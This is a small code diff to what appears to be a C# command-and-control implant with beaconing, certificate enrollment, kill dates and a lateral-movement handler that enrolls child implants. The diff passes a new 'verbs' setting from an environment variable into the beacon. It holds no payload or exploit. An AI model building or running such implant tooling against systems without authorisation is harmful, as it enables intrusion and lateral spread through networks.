@@ -82,7 +82,7 @@ internal static class ImplantApp
 
         // The lateral.move handler re-enrolls a child against the same enroll path,
         // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
-        // inputs and the parent's own id into the runner so a dispatched lateral.move
+        // inputs and the parent's own id into the beacon's handler registry so a
         // can derive a child that enrolls back. The child's stager token arrives in
         // the task arguments, not here: this implant's own token is already spent.
         var enroll = new EnrollBundle
@@ -95,7 +95,8 @@ internal static class ImplantApp
 
         var beacon = new Beacon(
             beaconUrl, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
-            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll, Console.Error);
+            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
+            config.ClassVerbs, Console.Error);
         try
         {
             await beacon.RunAsync(cts.Token);
@@ -222,6 +223,7 @@ internal static class BakedProfileSupport
         // env when it is not already present, so an explicit env always wins over
         // the bake.
         SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
+        SetEnvIfPresent(root, "verbs", "ROD_VERBS");
         SetEnvIfPresent(root, "beaconURL", "ROD_BEACON_URL");
         SetEnvIfPresent(root, "token", "ROD_STAGER_TOKEN");
         SetEnvIfPresent(root, "sleep", "ROD_SLEEP");
